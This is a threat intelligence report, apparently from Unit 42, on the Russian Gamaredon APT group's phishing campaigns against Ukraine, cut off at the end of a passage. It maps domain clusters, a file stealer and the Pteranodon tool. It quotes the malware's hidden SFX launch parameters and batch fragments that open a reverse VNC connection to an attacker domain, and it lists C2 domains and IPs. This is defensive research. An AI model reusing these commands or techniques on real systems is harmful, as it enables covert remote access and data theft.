{
    "id": "d2047000-7128-4ab0-b870-390a2665dfc4",
    "created_at": "2023-01-12T15:02:22.760807Z",
    "updated_at": "2025-03-27T02:13:57.174429Z",
    "deleted_at": null,
    "sha1_hash": "feb82f4ef5e80fc1f64c45013f85ede7cc753ebd",
    "title": "2022-02-03 - Russias Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine",
    "authors": "",
    "file_creation_date": "2022-05-25T14:27:51Z",
    "file_modification_date": "2022-05-25T14:27:51Z",
    "file_size": 1909205,
    "plain_text": "# Russia’s Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine (Updated Feb. 16)\n\n**unit42.paloaltonetworks.com/gamaredon-primitive-bear-ukraine-update-2021**\n\nFebruary 3, 2022\n\nBy [Unit 42](https://unit42.paloaltonetworks.com/author/unit42/)\n\nFebruary 3, 2022 at 1:00 PM\n\n[Category: Government,](https://unit42.paloaltonetworks.com/category/government/) [Malware](https://unit42.paloaltonetworks.com/category/malware-2/)\n\nTags: [Advanced URL Filtering,](https://unit42.paloaltonetworks.com/tag/advanced-url-filtering/) [APT,](https://unit42.paloaltonetworks.com/tag/apt/) [Cortex,](https://unit42.paloaltonetworks.com/tag/cortex/) [DNS security,](https://unit42.paloaltonetworks.com/tag/dns-security/) [Gamaredon,](https://unit42.paloaltonetworks.com/tag/gamaredon/) [next-generation firewall,](https://unit42.paloaltonetworks.com/tag/next-generation-firewall/) [primitive bear,](https://unit42.paloaltonetworks.com/tag/primitive-bear/) [Russia,](https://unit42.paloaltonetworks.com/tag/russia/) [Ukraine,](https://unit42.paloaltonetworks.com/tag/ukraine/)\n[WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\n[This post is also available in: 日本語 (Japanese)](https://unit42.paloaltonetworks.jp/gamaredon-primitive-bear-ukraine-update-2021/)\n\n**Updated Feb. 16 to include new information on Gamaredon infrastructure and Indicators of Compromise (IoCs).**\n\n## Executive Summary\n\nSince November, geopolitical tensions between Russia and Ukraine have escalated dramatically. It is estimated that Russia has now\namassed over 100,000 troops on Ukraine's eastern border, leading some to speculate that an invasion may come next. On Jan. 14, 2022,\n[this conflict spilled over into the cyber domain as the Ukrainian government was targeted with destructive malware (WhisperGate) and a](https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/)\nseparate vulnerability in OctoberCMS was exploited to deface several Ukrainian government websites. While attribution of those events is\n[ongoing and there is no known link to Gamaredon (aka Primitive Bear), one of the most active existing advanced persistent threats](https://unit42.paloaltonetworks.com/tag/gamaredon/)\ntargeting Ukraine, we anticipate we will see additional malicious cyber activities over the coming weeks as the conflict evolves. We have\nalso observed recent activity from Gamaredon. In light of this, this blog provides an update on the Gamaredon group.\n\nSince 2013, just prior to Russia’s annexation of the Crimean peninsula, the Gamaredon group has primarily focused its cyber campaigns\nagainst Ukrainian government officials and organizations. In 2017, Unit 42 published its first research documenting Gamaredon’s\nevolving toolkit and naming the group, and over the years, several researchers have noted that the operations and targeting activities of\nthis group align with Russian interests. This link was recently substantiated on Nov. 4, 2021, when the Security Service of Ukraine (SSU)\n[publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea.](https://www.bleepingcomputer.com/news/security/ukraine-links-members-of-gamaredon-hacker-group-to-russian-fsb/)\n[Concurrently, the SSU also released an updated technical report documenting the tools and tradecraft employed by this group.](https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf)\n\nGiven the current geopolitical situation and the specific target focus of this APT group, Unit 42 continues to actively monitor for\nindicators of their operations. In doing so, we have mapped out three large clusters of their infrastructure used to support different\nphishing and malware purposes. These clusters link to over 700 malicious domains, 215 IP addresses and over 100 samples of malware.\n\n\n-----\n\nMonitoring these clusters, we observed an attempt to compromise a Western government entity in Ukraine on Jan. 19, 2022. We have\nalso identified potential malware testing activity and reuse of historical techniques involving open-source virtual network computing\n(VNC) software. The sections below offer an overview of our findings in order to aid targeted entities in Ukraine as well as cybersecurity\norganizations in defending against this threat group.\n\n**Update Feb. 16: When we originally published this report, we noted, “While we have mapped out three large clusters of currently active**\nGamaredon infrastructure, we believe there is more that remains undiscovered.” We have since discovered hundreds more Gamaredon[related domains, including known related-clusters, and also new clusters. We have updated our Indicators of Compromise (IoCs) to](https://unit42.paloaltonetworks.com/gamaredon-primitive-bear-ukraine-update-2021/#indicators-of-compromise)\ninclude these additional domains and cluster observations.\n\nFull visualization of the techniques observed, relevant courses of action and IoCs related to this Gamaredon report can be found in the\n[Unit 42 ATOM viewer.](https://unit42.paloaltonetworks.com/atoms/gamaredon/)\n\n[Palo Alto Networks customers receive protections against the types of threats discussed in this blog by products including Cortex XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr)\n[and the WildFire,](https://www.paloaltonetworks.com/products/secure-the-network/wildfire) [AutoFocus,](https://www.paloaltonetworks.com/cortex/autofocus) [Advanced URL Filtering and DNS Security subscription services for the Next-Generation Firewall.](https://www.paloaltonetworks.com/network-security/advanced-url-filtering)\n\nRelated Unit 42 Topics [Gamaredon,](https://unit42.paloaltonetworks.com/tag/gamaredon/) [APTs](https://unit42.paloaltonetworks.com/tag/APT/)\n\n## Table of Contents\n\nGamaredon Downloader Infrastructure (Cluster 1)\n\n-Cluster 1 History\n\n-Initial Downloaders\n\n-SFX Files and UltraVNC\n\nSSL Pivot to Additional Infrastructure and Samples\n\nFile Stealer (Cluster 2)\n\nPteranodon (Cluster 3)\n\nConclusion\n\n-Protections and Mitigations\n\nIndicators of Compromise\n\nAdditional Resources\n\n## Gamaredon Downloader Infrastructure (Cluster 1)\n\nGamaredon actors pursue an interesting approach when it comes to building and maintaining their infrastructure. Most actors choose to\ndiscard domains after their use in a cyber campaign in order to distance themselves from any possible attribution. However, Gamaredon’s\napproach is unique in that they appear to recycle their domains by consistently rotating them across new infrastructure. A prime example\n[can be seen in the domain libre4[.]space. Evidence of its use in a Gamaredon campaign was flagged by a researcher as far back as 2019.](https://twitter.com/Timele9527/status/1118343183971360769)\n[Since then, Cisco Talos and Threatbook have also firmly attributed the domain to Gamaredon. Yet despite public attribution, the domain](https://blog.talosintelligence.com/2021/02/gamaredonactivities.html)\ncontinues to resolve to new internet protocol (IP) addresses daily.\n\n\n-----\n\nFigure 1. libre4[.]space recent IP resolutions as of Jan. 27, 2022.\n\nPivoting to the first IP on the list (194.58.100[.]17) reveals a cluster of domains rotated and parked on the IP on the exact same day.\n\n\n-----\n\nFigure 2. Domains associated with 194.58.100[.]17 on Jan. 27, 2022.\n\nThorough pivoting through all of the domains and IP addresses results in the identification of almost 700 domains. These are domains\nthat are already publicly attributed to Gamaredon due to use in previous cyber campaigns, mixed with new domains that have not yet\nbeen used. Drawing a delineation between the two then becomes an exercise in tracking the most recent infrastructure.\nFocusing on the IP addresses linked to these domains over the last 60 days results in the identification of 136 unique IP addresses;\ninterestingly, 131 of these IP addresses are hosted within the autonomous system (AS) 197695 physically located in Russia and operated\nby the same entity used as the registrar for these domains, reg[.]ru. The total number of IPs translates to the introduction of roughly two\nnew IP addresses every day into Gamaredon’s malicious infrastructure pool. Monitoring this pool, it appears that the actors are activating\nnew domains, using them for a few days, and then adding the domains to a pool of domains that are rotated across various IP\ninfrastructure. This shell game approach affords a degree of obfuscation to attempt to hide from cybersecurity researchers.\n\nFor researchers, it becomes difficult to correlate specific payloads to domains and to the IP address that the domain resolved to on the\nprecise day of a phishing campaign. Furthermore, Gamaredon’s technique provides the actors with a degree of control over who can\naccess malicious files hosted on their infrastructure, as a web page’s uniform resource locator (URL) file path embedded in a downloader\nonly works for a finite period of time. Once the domains are rotated to a new IP address, requests for the URL file paths will result in a\n“404” file not found error for anyone attempting to study the malware.\n\n### Cluster 1 History\n\nWhile focusing on current downloader infrastructure, we were able to trace the longevity of this cluster back to an origin in 2018. Certain\n“marker” domains, such as the aforementioned libre4[.]space, are still active today and also traced back to March 2019 with apparently\nconsistent ownership. On the same date range in March 2019, a cluster of domains was observed on 185.158.114[.]107 with thematically\nlinked naming – several of which are still active in this cluster today.\n\n\n-----\n\nFigure 3. Domain cluster on 185.158.114[.]107 in March 2019.\n\nFurther pivoting back in time and across domains finds an apparent initial domain for this cluster of infrastructure, bitsadmin[.]space on\n195.88.209[.]136, in December 2018.\n\nFigure 4. Initial domain bitsadmin[.]space, December 2018.\n\nWe see it clustered here with some dynamic domain name system (DNS) domains. Dynamic DNS domains were observed in this cluster\non later IP addresses as well, though this technique appears to have fallen out of favor, at least in this context, since there are none in this\ncluster currently active.\n\n### Initial Downloaders\n\n\n-----\n\nSearching for samples connecting to Gamaredon infrastructure across public and private malware repositories resulted in the\nidentification of 17 samples over the past three months. The majority of these files were either shared by entities in Ukraine or contained\nUkrainian filenames.\n\n**Filename** **Translation**\n\nМаксим.docx Maksim.docx\n\nПІДОЗРА РЯЗАНЦЕВА.docx RAZANTSEV IS SUSPICIOUS.docx\n\nпротокол допиту.docx interrogation protocol.docx\n\nТЕЛЕГРАММА.docx TELEGRAM.docx\n\n2_Пам’ятка_про_процесуальні_права_та_обов’язки_потерпілого.docx 2_Memorial_about_processal_rights_and_obligations_of_the_\nVictim.docx\n\n2_Porjadok_do_nakazu_111_vid_13.04.2017.docx 2_Procedure_to_order_111_from_13.04.2017.docx\n\nвисновок тимошечкин.docx conclusion Timoshechkin.docx\n\nЗвіт на ДМС за червень 2021 (Автосохраненный).doc Report on the LCA for June 2021 (Autosaved) .doc\n\nвисновок Кличко.docx Klitschko's conclusion.docx\n\nОбвинувальний акт ГЕРМАН та ін.docx Indictment GERMAN et al.docx\n\nсупровід 1-СЛ 10 місяців.doc support 1-SL 10 months.doc\n\n_Table 1. Recently observed downloader filenames._\n\nAn analysis of these files found that they all leveraged a remote template injection technique that allows the documents to pull down the\nmalicious code once they are opened. This allows the attacker to have control over what content is sent back to the victim in an otherwise\nbenign document. Recent examples of the remote template “dot” file URLs these documents use include the following:\n\nhttp://bigger96.allow.endanger.hokoldar[.]ru/[Redacted]/globe/endanger/lovers.cam\nhttp://classroom14.nay.sour.reapart[.]ru/[Redacted]/bid/sour/glitter.kdp\nhttp://priest.elitoras[.]ru/[Redacted]/pretend/pretend/principal.dot\nhttp://although.coferto[.]ru/[Redacted]/amazing.dot\nhttp://source68.alternate.vadilops[.]ru/[Redacted]/clamp/interdependent.cbl\n\nMany of the files hosted on the Gamaredon infrastructure are labeled with abstract extensions such as .cam, .cdl, .kdp and others. We\nbelieve this is an intentional effort by the actor to reduce exposure and detection of these files by antivirus and URL scanning services.\n\nTaking a deeper look at the top two, hokoldar[.]ru and reapart[.]ru, provides unique insights into two recent phishing campaigns.\nBeginning with the first domain, passive DNS data shows that the domain first resolved to an IP address that was shared with other\nGamaredon domains on Jan. 4. Figure 2 above shows that hokoldar[.]ru continued to share an IP address with libre4[.]space on Jan. 27,\nonce again associating it with the Gamaredon infrastructure pool. In that short window, on Jan. 19, we observed a targeted phishing\nattempt against a Western government entity operating in Ukraine.\n\nIn this attempt, rather than emailing the downloader directly to their target, the actors instead leveraged a job search and employment\nservice within Ukraine. In doing so, the actors searched for an active job posting, uploaded their downloader as a resume and submitted it\nthrough the job search platform to a Western government entity. Given the steps and precision delivery involved in this campaign, it\nappears this may have been a specific, deliberate attempt by Gamaredon to compromise this Western government organization.\n\nExpanding beyond this recent case, we also discovered public evidence of a Gamaredon campaign targeting the State Migration Service of\nUkraine. On Dec. 1, an email was sent from yana_gurina@ukr[.]net to 6524@dmsu[.]gov.ua. The subject of the email was “NOVEMBER\nREPORT” and attached to the email was a file called “Report on the LCA for June 2021(Autosaved).doc.” When opened, this Word\ndocument calls out to reapart[.]ru. From there, it downloads and then executes a malicious remote Word Document Template file named\nglitter.kdp.\n\n\n-----\n\nFigure 5. Email sent to 6524@dmsu[.]gov.ua.\n\nCERT Estonia (CERT-EE), a department within the Cyber Security Branch of the Estonian Information System Authority, recently\n[published an article on Gamaredon which covers the content returned from these remote template files. To summarize their findings on](https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf)\nthis aspect, the remote template retrieves a VBS script to execute which establishes a persistent command and control (C2) check-in and\nwill retrieve the next payload once the Gamaredon group is ready for the next phase. In CERT-EE’s case, after six hours the infrastructure\ncame back to life again and downloaded a SelF-eXtracting (SFX) archive.\nThis download of an SFX archive is a hallmark of the Gamaredon group and has been an observed technique for many years to deliver\nvarious open-source virtual network computing (VNC) software packages that the group uses for maintaining remote access to victim\ncomputers. The group’s current preference appears to be open-source UltraVNC software.\n\n### SFX Files and UltraVNC\n\nSFX files allow someone to package other files in an archive and then specify what will happen when a user opens the package. In the case\nof Gamaredon, they generally keep it simple and bundle together a package containing a simple Batch script and UltraVNC software. This\nlightweight VNC server can be preconfigured to initiate a connection back to another system, commonly referred to as a reverse tunnel,\nallowing attackers to bypass the typical firewall restrictions; these reverse connections seemingly are not initiated by the attacker but\ninstead come from inside the network where the victim exists. To illustrate how this occurs, we will step through one of the SFX files\n(SHA256: 4e9c8ef5e6391a9b4a705803dc8f2daaa72e3a448abd00fad36d34fe36f53887) that we recently identified.\n\nWhen building an SFX file one has the option to specify a series of commands that will be executed upon successful extraction of the\narchive. In the case of Gamaredon, the majority of SFX files will launch a batch file, which is included in the archive. In some instances,\nthe actor will shuffle files around within the archive to try to obfuscate what they are, but usually a command line switch can be found,\nsimilar to this:\n\n;!@Install@!UTF-8!\n\nInstallPath=\"%APPDATA%\\\\Drivers\"\n\nGUIMode=\"2\"\n\nSelfDelete=\"1\"\n\nRunProgram=\"hidcon:34679.cmd\"\n\nThis will extract the files to %APPDATA%\\\\Drivers and then run the Windows Batch file 34679.cmd in a hidden console. The use of the\nhidcon (hidden console) prefix followed by a four-five digit filename with a cmd extension is observed in the majority of our tracked\nsamples during this time period.\n\nThe following files were included in this particular archive:\n\n**SHA256** **Filename**\n\n695fabf0d0f0750b3d53de361383038030752d07b5fc8d1ba6eb8b3e1e7964fa 34679.cmd\n\nd8a01f69840c07ace6ae33e2f76e832c22d4513c07e252b6730b6de51c2e4385 MSRC4Plugin_for_sc.dsm\n\n393475dc090afab9a9ddf04738787199813f3974a22c13cb26f43c781e7b632f QlpxpQpOpDpnpRpC.ini\n\ned13f0195c0cf8fc9905c89915f5b6f704140b36309c2337be86d87a8f5fef6c UltraVNC.ini\n\n304d63fcd859ea71833cf13b8923f74ebe24abf750de9d01b7849b907f24d33b YiIbIbIqIZIiIBI2.jpg\n\n1f1650155bfe9a4eb6b69365fc8a791281f866919202d44646e23e7f2f1d3db9 kqT5TMTETyTJT4TG.jpg\n\n\n-----\n\n27285cb2b5bebd5730772b66b33568154cd4228c92913c5ef2e1234747027aa5 owxxxGxzxqxxxExw.jpg\n\n3225058afbdf79b87d39a3be884291d7ba4ed6ec93d1c2010399e11962106d5b rc4.key\n\n_Table 2. Files included in the example SFX Archive._\n\nThe batch files use randomized alphanumeric strings for the variable names, and – depending on the sample – collect different\ninformation or use different domains and filenames; however, at the core they each perform one specific function – initiate the reverse\nVNC connection. The purpose of this file is to obscure and execute the desired command: start \"\" \"%CD%\\sysctl.exe\" -autoreconnect -id:\n\n[system media access control (MAC) address] -connect technec[.]org:8080\n\nFigure 6: Content of 34679.cmd from above example.\n\nIn this case, the attacker sets the variable nRwuwCwBwYwbwEwI twice, which we believe is likely due to copy-pasting from previous\nscripts (we’ll cover this in more detail later). This variable, along with the next few, will identify the process name the malware will\nmasquerade under, an identifier with which to track the victim, the remote attacker’s domain to which the connection should be made,\nthe word connect, which is dropped into the VNC command, and then the port, 8080, which the VNC connection will use. At every turn,\nthe actor tries to blend into normal user traffic to remain under the radar for as long as possible.\n\nAfter the variables are set, the command line script copies QlpxpQpOpDpnpRpC.ini to the executable name that has been picked for this\nrun and then attempts to kill any legitimate process using the specified name before launching it. The name for the .ini file is randomized\nper archive, but almost always turns out to be that of the VNC server itself.\n\nAs stated previously, one benefit of this VNC server is that it will use the supplied configuration file (UltraVNC.ini), and – along with the\ntwo files rc4.key and MSRC4Plugin_for_sc.dsm – will encrypt the communication to further hide from network detection tools.\n\nIt’s not yet clear what the three .jpg files shown in Table 2 are used for as they are base64-encoded data that is likely XOR encoded with a\nlong key. Gamaredon has used this technique in the past, but these are likely staged files for the attacker to decode once they connect to\nthe system.\n\nThe following are the SFX launch parameters from a separate file to illustrate how the actor attempts to obfuscate the file names but also\nthat these potentially staged files are not present in all samples.\n\nInstallPath=\"%USERPROFILE%\\\\Contacts\"\n\nGUIMode=\"2\"\n\nSelfDelete=\"1\"\n\nRunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\18820.tmp\n%USERPROFILE%\\Contacts\\MSRC4Plugin_for_sc.dsm\"\n\nRunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\25028.tmp %USERPROFILE%\\Contacts\\rc4.key\"\n\n\n-----\n\nRunProgram hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\24318.tmp %USERPROFILE%\\Contacts\\UltraVNC.ini\nRunProgram=\"hidcon:cmd.exe /c copy /y %USERPROFILE%\\Contacts\\25111.tmp %USERPROFILE%\\Contacts\\wn.cmd\"\nRunProgram=\"hidcon:%USERPROFILE%\\\\Contacts\\\\wn.cmd\"\n\nWhile investigating these files, we observed what we believe was active development on these .cmd files that helps illuminate the\nGamaredon group’s processes.\n\nSpecifically, on Jan. 14 starting at 01:23 am GMT, we began seeing VirusTotal uploads of a seemingly in-draft .cmd file pointing to the\nsame attacker-controlled VNC server. Initially, these files were uploaded to VirusTotal via the Tor network and used the process name\nsvchosst over transmission control protocol (TCP)/8080, leveraging the user’s Windows security identifier (SID) instead of MAC address\nfor the VNC identification. The SFX files simply had the name 1.exe.\n\n@for /f %%i in ('wmic useraccount where name^='%USERNAME%' get\nsid ^| find \"S-1\"') do set JsVqVzVxVfVqVaVs=%%i\nset ZGVxVkVIVUVlVgVb=technec[.]org\nset qgSjSdSaSsSiSGS3=svchosst\nset AVlflclclZlPlYlI=8080\nset djM8MfMRM0M5MBM0=connect\n\nThree minutes later, we saw the same file uploaded via Tor, but the actor had changed the port to TCP/80 and introduced a bug in the\ncode that prevents it from executing correctly. Note the positional change of the variables as well.\n\nset djM8MfMRM0M5MBM0=onnect\nset r8JgJJJHJGJmJHJ5=%RANDOM%\nset ZGVxVkVIVUVlVgVb=technec[.]org\nset qgSjSdSaSsSiSGS3=svchosst\nset AVlflclclZlPlYlI=80\n\nThe bug is due to the onnect value that is set. Reviewing how the reverse VNC connection is launched, this value is used in two places: autorec%djM8MfMRM0M5MBM0% and -%djM8MfMRM0M5MBM0%.\n\nstart \"1\" \"%CD%\\%qgSjSdSaSsSiSGS3%.exe\"\n-autorec%djM8MfMRM0M5MBM0% -id:%r8JgJJJHJGJmJHJ5%\n-%djM8MfMRM0M5MBM0% %ZGVxVkVIVUVlVgVb%:80%AVlflclclZlPlYlI%\n\nThe second instance doesn’t contain the c value needed to correctly spell the word and thus presents an invalid parameter. After another\nthree minutes, the actor uploaded an SFX file called 2.exe, simply containing test.cmd with the word test in the content.\n\nAgain, minutes later, we saw 2.exe uploaded with the test.cmd, but this time it contained the initial part of the .cmd file. However, the\nactor had forgotten to include the VNC connect string.\n\nThis is where it gets interesting, though – about 15 minutes later, we saw the familiar 2.exe upload with test.cmd, but this time it was\nbeing uploaded directly by a user in Russia from a public IP address. We continued to observe this pattern of uploads every few minutes,\nwhere each was a slight iteration of the one before. The person uploading the files appeared to be rapidly – and manually – modifying the\n.cmd file to restore functionality (though the actor was unsuccessful in this series of uploads).\n\nSeveral domains and IP addresses were hard-coded in VNC samples that are not related to any of domain clusters 1-3 (documented in our\nfull IoC list).\n\n## SSL Pivot to Additional Infrastructure and Samples\n\nWhile conducting historical research on the infrastructure in cluster 1, we discovered a self-signed certificate associated with cluster 1 IP\naddress 92.242.62[.]96:\n\nSerial: 373890427866944398020500009522040110750114845760\n\nSHA1: 62478d7653e3f5ce79effaf7e69c9cf3c28edf0c\n\nIssued: 2021-01-27\n\nExpires: 2031-01-25\n\nCommon name: ip45-159-200-109.crelcom[.]ru\n\nAlthough the IP Address WHOIS record for Crelcom LLC is registered to an address in Moscow, the technical admin listed for the\nnetblock containing the IP address is registered to an address in Simferopol, Crimea. We further trace the apparent origins of Crelcom\nback to Simferopol, Crimea, as well.\n\nThis certificate relates to 79 IP addresses:\n\n\n-----\n\nThe common name IP address no Gamaredon domains\nOne IP address links to cluster 1 above (92.242.62[.]96)\n76 IP addresses link to another distinct collection of domains – “cluster 2”\n1 IP address led us to another distinct cluster, “cluster 3” (194.67.116[.]67)\n\nWe find almost no overlap of IP addresses between these separate clusters.\n\n## File Stealer (Cluster 2)\n\nOf the 76 IP addresses we associate with cluster 2, 70 of them have confirmed links to C2 domains associated with a variant of\nGamaredon’s file stealer tool. Within the last three months, we have identified 23 samples of this malware, twelve of which appear to have\nbeen shared by entities in Ukraine. The C2 domains in those samples include:\n\n**Domain** **First Seen**\n\njolotras[.]ru 12/16/2021\n\nmoolin[.]ru 10/11/2021\n\nnaniga[.]ru 9/2/2021\n\nnonimak[.]ru 9/2/2021\n\nbokuwai[.]ru 9/2/2021\n\nkrashand[.]ru 6/17/2021\n\ngorigan[.]ru 5/25/2021\n\n_Table 3. Recent file stealer C2 domains._\n\nAs you can see, some of these domains were established months ago, yet despite their age, they continue to enjoy benign reputations. For\nexample, only five out of 93 vendors consider the domain krashand[.]ru to be malicious on VirusTotal.\n\nFigure 7. VirusTotal results for krashand[.]ru from Jan. 27, 2022.\n\nReviewing passive DNS (pDNS) logs for these domains quickly reveals a long list of subdomains associated with each. Some of the\nsubdomains follow a standardized pattern. For example, several of the domains use the first few letters of the alphabet (a, b, c) in a\nrepeating combination. Conversely, jolotras[.]ru and moolin[.]ru use randomized alphanumeric characters. We believe that these\nsubdomains are dynamically generated by the file stealer when it first establishes a connection with its C2 server. As such, counting the\nnumber of subdomains associated with a particular C2 domain provides a rough gauge of the number of entities that have attempted to\nconnect to the server. However, it is important to also note that the number of pDNS entries can also be skewed by researchers and\ncybersecurity products that may be evaluating the malicious samples associated with a particular C2 domain.\n\n**Subdomains**\n\n637753576301692900[.]jolotras.ru\n\n637753623005957947[.]jolotras[.]ru\n\n637755024217842817.jolotras[.]ru\n\na.nonimak[.]ru\n\naaaa.nonimak[.]ru\n\naaaaa.nonimak[.]ru\n\n\n-----\n\naaaaaa.nonimak[.]ru\n\n0enhzs.moolin[.]ru\n\n0ivrlzyk.moolin[.]ru\n\n0nxfri.moolin[.]ru\n\n_Table 4. Subdomain naming for file stealer infrastructure._\n\nIn mapping these domains to their corresponding C2 infrastructure, we discovered that the domains overlap in terms of the IP addresses\nthey point to. This allowed us to identify the following active infrastructure:\n\n**IP Address** **First Seen**\n\n194.58.92[.]102 1/14/2022\n\n37.140.199[.]20 1/10/2022\n\n194.67.109[.]164 12/16/2021\n\n89.108.98[.]125 12/26/2021\n\n185.46.10[.]143 12/15/2021\n\n89.108.64[.]88 10/29/2021\n\n_Table 5. Recent file stealer IP infrastructure._\n\nOf note, all of the file stealer infrastructure appears to be hosted within AS197695, the same AS highlighted earlier. Historically, we have\nseen the C2 domains point to various autonomous systems (AS) globally. However, as of early November, it appears that the actors have\nconsolidated all of their file stealer infrastructure within Russian ASs – predominantly this single AS.\n\nIn mapping the patterns involved in the use of this infrastructure, we found that the domains are rotated across IP addresses in a manner\nsimilar to the downloader infrastructure discussed previously. A malicious domain may point to one of the C2 server IP addresses today\nwhile pointing to a different address tomorrow. This adds a degree of complexity and obfuscation that makes it challenging for network\ndefenders to identify and remove the malware from infected networks. The discovery of a C2 domain in network logs thus requires\ndefenders to search through their network traffic for the full collection of IP addresses that the malicious domain has resolved to over\ntime. As an example, moolin[.]ru has pointed to 11 IP addresses since early October, rotating to a new IP every few days.\n\n**IP Address** **Country** **AS** **First Seen** **Last Seen**\n\n194.67.109[.]164 RU 197695 2021-12-28 2022-01-27\n\n185.46.10[.]143 RU 197695 2021-12-16 2021-12-26\n\n212.109.199[.]204 RU 29182 2021-12-15 2021-12-15\n\n80.78.241[.]253 RU 197695 2021-11-19 2021-12-14\n\n89.108.78[.]82 RU 197695 2021-11-16 2021-11-18\n\n194.180.174[.]46 MD 39798 2021-11-15 2021-11-15\n\n70.34.198[.]226 SE 20473 2021-10-14 2021-10-30\n\n104.238.189[.]186 FR 20473 2021-10-13 2021-10-14\n\n95.179.221[.]147 FR 20473 2021-10-13 2021-10-13\n\n176.118.165[.]76 RU 43830 2021-10-12 2021-10-13\n\n_Table 6. Recent file stealer IP infrastructure_\n\nShifting focus to the malware itself, file stealer samples connect to their C2 infrastructure in a unique manner. Rather than connecting\ndirectly to a C2 domain, the malware performs a DNS lookup to convert the domain to an IP address. Once complete, it establishes an\nHTTPS connection directly to the IP address. For example:\n\n\n-----\n\nC2 Domain: moolin[.]ru\nC2 IP Address: 194.67.109[.]164\nC2 Comms: https://194.67.109[.]164/zB6OZj6F0zYfSQ\n\nThis technique of creating distance between the domain and the physical C2 infrastructure seems to be an attempt to bypass URL\nfiltering:\n\n1. The domain itself is only used in an initial DNS request to resolve the C2 server IP address – no actual connection is attempted\n\nusing the domain name.\n2. Identification and blocking of a domain doesn’t impact existing compromises as the malware will continue to communicate directly\n\nwith the C2 server using the IP address – even if the domain is subsequently deleted or rotated to a new IP – as long as the malware\ncontinues to run.\n\nOne recent file stealer sample we analyzed (SHA256: f211e0eb49990edbb5de2bcf2f573ea6a0b6f3549e772fd16bf7cc214d924824) was\nfound to be a .NET binary that had been obfuscated to make analysis more difficult. The first thing that jumps out when reviewing these\nfiles are their sizes. This particular file clocks in at over 136 MB in size, but we observed files going all the way up to 200 MB and beyond.\nIt is possible that this is an attempt to circumvent automated sandbox analysis, which usually avoids scanning such large files. It may also\nsimply be a byproduct of the obfuscation tools being used. Whatever the reason for the large file size, it comes at a price to the attacker, as\nexecutables of this size stick out upon review. Transmitting a file this large to a victim becomes a much more challenging task.\n\nThe obfuscation within this sample is relatively simple and mainly relies upon defining arrays and concatenating strings of single\ncharacters in high volume over hundreds of lines to try to hide the construction of the actual string within the noise.\n\nFigure 8. Building the string “IconsCache.db” in the “text” variable.\n\nIt begins by checking for the existence of the Mutex Global\\lCHBaUZcohRgQcOfdIFaf, which, if present, implies the malware is already\nrunning and will cause the file stealer to exit. Next, it will create the folder C:\\Users\\%USER%\\AppData\\Local\\TEMP\\ModeAuto\\icons,\nwherein screenshots that are taken every minute will be stored and then transmitted to the C2 server with the name format YYYY-MMDD-HH-MM.jpg.\n\nTo identify the IP address of the C2 server, the file stealer will generate a random string of alphanumeric characters between eight and 23\ncharacters long, such as 9lGo990cNmjxzWrDykSJbV.jolotras[.]ru.\n\nAs mentioned previously, once the file stealer retrieves the IP address for this domain, it will no longer use the domain name. Instead, all\ncommunications will be direct with the IP address.\n\nDuring execution, it will search all fixed and network drives attached to the computer for the following extensions:\n\n.doc\n.docx\n.xls\n\nrtf\n\n\n-----\n\n.odt\n.txt\n.jpg\n.pdf\n.ps1\n\nWhen it has a list of files on the system, it begins to create a string for each that contains the path of the file, the size of the file and the last\ntime the file was written to, similar to the example below:\n\nC:\\cygwin\\usr\\share\\doc\\bzip2\\manual.pdf2569055/21/2011 3:17:02 PM\n\nThe file stealer takes this string and generates an MD5 hash of it, resulting in the following output for this example:\n\nFB-17-F1-34-F4-22-9B-B4-49-0F-6E-3E-45-E3-C9-FA\n\nNext, it removes the hyphens from the hash and converts all uppercase letters to lowercase. These MD5 hashes are then saved into the file\nC:\\Users\\%USER%\\AppData\\Local\\IconsCache.db. The naming of this file is another attempt to hide in plain sight next to the legitimate\nIconCache.db.\n\nFigure 9. IconsCache.db contents.\n\nThe malware uses this database to track unique files.\n\nThe malware will then generate a URL path with alphanumeric characters for its C2 communication, using the DNS-IP technique\nillustrated previously with the moolin[.]ru domain example:\n\nhttps://194.67.109[.]164/zB6OZj6F0zYfSQ\n\nBelow is the full list of domains currently resolving to cluster 2 IP addresses:\n\n**Domain** **Registered**\n\njolotras[.]ru 12/16/2021\n\nmoolin[.]ru 10/11/2021\n\nbokuwai[.]ru 9/2/2021\n\nnaniga[.]ru 9/2/2021\n\nnonimak[.]ru 9/2/2021\n\nbilargo[.]ru 7/23/2021\n\nkrashand[.]ru 6/17/2021\n\nfirtabo[.]ru 5/28/2021\n\n\n-----\n\ngorigan[.]ru 5/25/2021\n\nfirasto[.]ru 5/21/2021\n\nmyces[.]ru 2/24/2021\n\nteroba[.]ru 2/24/2021\n\nbacilluse[.]ru 2/15/2021\n\ncirculas[.]ru 2/15/2021\n\nmegatos[.]ru 2/15/2021\n\nphymateus[.]ru 2/15/2021\n\ncerambycidae[.]ru 1/22/2021\n\ncoleopteras[.]ru 1/22/2021\n\ndanainae[.]ru 1/22/2021\n\n_Table 7. All cluster 2 domains._\n\n## Pteranodon (Cluster 3)\n\nThe single remaining IP address related to the SSL certificate was not related to either cluster 1 or cluster 2, and instead led us to a third,\ndistinct cluster of domains.\n\nThis final cluster appears to serve as the C2 infrastructure for a custom remote administration tool called Pteranodon. Gamaredon has\nused, maintained and updated development of this code for years. Its code contains anti-detection functions specifically designed to\nidentify sandbox environments in order to thwart antivirus detection attempts. It is capable of downloading and executing files, capturing\nscreenshots and executing arbitrary commands on compromised systems.\n\nOver the last three months, we have identified 33 samples of Pteranodon. These samples are commonly named 7ZSfxMod_x86.exe.\nPivoting across this cluster, we identified the following C2 infrastructure:\n\n**Domain** **Registered**\n\ntakak[.]ru 9/18/2021\n\nrimien[.]ru 9/18/2021\n\nmaizuko[.]ru 9/2/2021\n\niruto[.]ru 9/2/2021\n\ngloritapa[.]ru 8/5/2021\n\ngortisir[.]ru 8/5/2021\n\ngortomalo[.]ru 